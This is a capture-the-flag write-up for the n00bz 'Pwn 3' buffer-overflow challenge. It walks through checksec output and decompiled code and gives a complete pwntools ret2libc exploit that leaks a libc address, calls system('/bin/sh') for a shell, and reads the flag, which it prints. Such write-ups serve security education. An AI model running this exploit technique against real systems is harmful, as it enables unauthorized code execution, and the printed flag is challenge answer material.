# **Pwn 3**
Textbook buffer overflow *without* win function

*NOTE : I solved this in pretty much the EXACT same way as pwn2*

# Executable
checksec :
```
[*] '/home/skuuk/n00bz/pwn3'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
decompilation :
```C
void main(EVP_PKEY_CTX *param_1)

{
  char local_28 [32];
  
  init(param_1);
  puts("Would you like a flag?");
  fgets(local_28,0x50,stdin);
  puts("n00bz{f4k3_fl4g}");
  return;
}
```
no canary, the only local on the stack is the buffer `local_28` itself so the returned address is at offset `32 + 8 = 40` 
(counting 8 bytes for the saved `rbp`)
# Exploit

The exploit is in 2 phases :
- first we leak the address of libc by returning to puts (via the plt) with the got entry of puts as argument (which contains the adress of puts in libc since puts has been called previously) then return to `main`
- second we return to system with the address of `/bin/sh\x00` as argument to spawn a shell

*Returning to main allows us use the buffer overflow a second time*
```python
io = start()

# gadgets in the executable
pop_rdi = 0x401232
ret = 0x40101a

# leak libc base + return to main
rop1 = p64(pop_rdi)
rop1 += p64(exe.got['puts'])
rop1 += p64(exe.plt['puts'])
rop1 += p64(exe.symbols['main'])

# return to system
io.sendline(b'a'*40 + rop1)
io.recvuntil('}\n')
libc = exe.libc
libc.address = int.from_bytes(io.recvline()[:-1],'little') - libc.symbols['puts']
print(f"libc : 0x{libc.address:x}")

rop2 = p64(pop_rdi)
rop2 += p64(next(libc.search(b'/bin/sh\x00')))
rop2 += p64(ret)
rop2 += p64(libc.symbols['system'])
io.sendline(b'a'*40 + rop2)

io.sendline("cat flag.txt")

io.interactive()
```

# Flag
```
n00bz{1f_y0u_h4ve_n0th1ng_y0u_h4ve_l1bc}
```